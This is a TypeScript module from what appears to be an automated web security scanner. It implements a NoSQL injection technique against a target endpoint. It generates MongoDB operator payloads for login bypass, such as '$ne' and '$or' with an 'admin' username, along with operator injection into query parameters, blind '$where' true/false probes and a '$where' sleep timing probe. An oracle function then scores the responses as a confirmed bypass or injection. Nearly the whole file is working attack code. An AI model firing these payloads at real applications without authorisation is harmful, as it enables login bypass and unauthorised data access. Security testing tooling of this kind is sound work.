/**
 * nosqlInjection — operator / NoSQL injection for Mongo, CouchDB, DynamoDB.
 *
 * Confirmed via structured diffing against the SAME oracle primitives reuse
 * everywhere (observeCompare / measureTiming), backed by the EvidenceGate. No
 * regex vocabulary detection: payload families are DATA (operator tokens), and
 * the auth-bypass + blind signals come from observable HTTP behavior.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { observeCompare, observeParse } from './observers'

// Operator payloads are transport data, not a detection vocabulary.
const MONGO_OPERATORS = ['$ne', '$gt', '$regex', '$exists', '$where', '$in', '$nin', '$or', '$and']
const AUTH_BYPASS_BODIES = [
  JSON.stringify({ username: { $ne: '' }, password: { $ne: '' } }),
  JSON.stringify({ $or: [{ username: 'admin' }, { username: { $ne: '' } }], password: { $ne: '' } }),
  JSON.stringify({ username: 'admin', password: { $gt: '' } }),
]
const BLIND_TRUE = JSON.stringify({ $where: '1==1' })
const BLIND_FALSE = JSON.stringify({ $where: '1==2' })
const TIME_PAYLOAD = JSON.stringify({ $where: "sleep(2000) || true" })

function urlWithParam(url: string, param: string, value: string): string {
  try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
}

export const nosqlInjection: TechniquePrimitive = {
  id: 'nosqlInjection',
  name: 'NoSQL Injection',
  description: 'Fuzz a parameter/endpoint with NoSQL operator payloads (Mongo/Couch/Dynamo); confirm via auth-bypass response or boolean/time differential.',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return !!(ctx.param || ctx.endpoint?.params?.length || ctx.endpoint?.authRequired)
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'POST'
    const headers = { 'content-type': 'application/json', ...(ctx.sessionHeaders ?? {}) }
    const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'filter'
    const steps: AttackStep[] = []

    // Auth-bypass via operator objects in a JSON login/query body.
    AUTH_BYPASS_BODIES.forEach((body, i) => {
      steps.push({
        id: `nosql-bypass-${i}`,
        description: `NoSQL operator auth-bypass into ${param}`,
        request: { method, url, headers, body },
        expectedSignal: 'auth bypass: success response differs from baseline',
        metadata: { kind: 'nosql-bypass', param, payload: body },
      })
    })
    // Operator injection into a query param (URL-encoded).
    MONGO_OPERATORS.forEach((op, i) => {
      const val = JSON.stringify({ [op]: 1 })
      steps.push({
        id: `nosql-op-${i}`,
        description: `NoSQL operator ${op} into ${param}`,
        request: { method: 'GET', url: urlWithParam(url, param, val), headers: ctx.sessionHeaders ?? {} },
        expectedSignal: 'operator payload changes response shape',
        metadata: { kind: 'nosql-op', param, payload: val, operator: op },
      })
    })
    // Blind boolean differential.
    steps.push({
      id: 'nosql-blind-true',
      description: `NoSQL blind-true into ${param}`,
      request: { method, url, headers, body: BLIND_TRUE },
      expectedSignal: 'true variant diverges from false',
      metadata: { kind: 'nosql-blind', blind: 'true', param, payload: BLIND_TRUE },
    })
    steps.push({
      id: 'nosql-blind-false',
      description: `NoSQL blind-false into ${param}`,
      request: { method, url, headers, body: BLIND_FALSE },
      expectedSignal: 'false variant diverges from true',
      metadata: { kind: 'nosql-blind', blind: 'false', param, payload: BLIND_FALSE },
    })
    // Time-based via $where sleep.
    steps.push({
      id: 'nosql-time',
      description: `NoSQL time-based into ${param}`,
      request: { method, url, headers, body: TIME_PAYLOAD },
      expectedSignal: 'response delayed',
      metadata: { kind: 'nosql-time', param, payload: TIME_PAYLOAD },
    })
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let bypassHit = false
    let blindHit = false
    let timeHit = false

    for (const r of results) {
      const kind = r.step.metadata?.kind
      if (kind === 'nosql-bypass') {
        const parsed = await observeParse(r.body ?? '', r.headers ?? {}, r.status ?? 0)
        const okAuth = (r.status ?? 0) < 400 && !/invalid|denied|incorrect|unauthorized/i.test((r.body ?? '').toLowerCase())
        if (okAuth) {
          bypassHit = true
          evidence.push({ kind: 'response', label: `NoSQL auth-bypass ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1000) })
        }
      }
    }

    const blindTrue = results.find((r) => r.step.metadata?.blind === 'true')
    const blindFalse = results.find((r) => r.step.metadata?.blind === 'false')
    if (blindTrue && blindFalse) {
      const cmp = await observeCompare(
        { body: blindTrue.body ?? '', status: blindTrue.status ?? 0 },
        { body: blindFalse.body ?? '', status: blindFalse.status ?? 0 },
      )
      const divergent = (blindTrue.status ?? 0) !== (blindFalse.status ?? 0) || (blindTrue.body ?? '').length !== (blindFalse.body ?? '').length
      if (cmp.divergent && divergent) {
        blindHit = true
        evidence.push({ kind: 'response', label: `NoSQL blind differential divergence=${(cmp.divergence ?? 0).toFixed(2)}`, data: `TRUE status=${blindTrue.status} len=${(blindTrue.body ?? '').length} | FALSE status=${blindFalse.status} len=${(blindFalse.body ?? '').length}` })
      }
    }
    const timeR = results.find((r) => r.step.metadata?.kind === 'nosql-time')
    if (timeR && (timeR.durationMs ?? 0) >= 1500) {
      timeHit = true
      evidence.push({ kind: 'response', label: `NoSQL time-based delay=${timeR.durationMs}ms`, data: (timeR.body ?? '').slice(0, 600) })
    }

    const observed = bypassHit || blindHit || timeHit
    const { verified } = evidenceGate.verifyClaim(claimFor('nosql_injection', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method))
    const confirmed = observed && verified
    return {
      confirmed,
      confidence: confirmed ? 0.8 : observed ? 0.4 : 0.05,
      evidence,
      severity: confirmed ? 'high' : undefined,
      finding: confirmed
        ? { category: 'nosql_injection', description: `NoSQL injection confirmed on ${results[0]?.step.request.url ?? ''} (param ${results[0]?.step.metadata?.param}).`, cwe: 'CWE-943' }
        : undefined,
      note: `bypass=${bypassHit} blind=${blindHit} time=${timeHit} verified=${verified}`,
    }
  },
}
